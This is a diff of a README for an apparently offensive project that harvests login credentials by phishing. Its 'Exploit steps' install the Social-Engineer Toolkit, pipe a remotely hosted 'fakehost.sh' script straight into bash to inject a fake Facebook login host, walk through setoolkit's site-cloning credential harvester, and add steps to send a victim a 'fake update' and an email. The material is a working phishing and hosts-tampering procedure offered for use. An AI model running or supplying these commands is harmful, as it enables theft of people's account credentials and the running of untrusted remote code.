@@ -6,7 +6,7 @@
 
 ![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/https_image-620x499.jpg)
 
-# Exploit steps:
+
 1. - Installing requirements
      https://github.com/trustedsec/social-engineer-toolkit
 
@@ -21,13 +21,14 @@ $ pip install -r requirements.txt
 ```bash 
 setoolkit
 ```
+# Exploit steps:
 
-3. - Creating hosts exploit facebook.login.com
+1. - Creating hosts exploit facebook.login.com
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
 ```
 
-4. - setoolkit
+2. - setoolkit
 ```bash
 setoolkit
 1) Social-Engineering Attacks
@@ -49,7 +50,8 @@ set:webattack> Enter the url to clone: _your_site_
      enter
      enter
 ```
-
+3. - Fake update for victim
+4. - send email
 
 
 
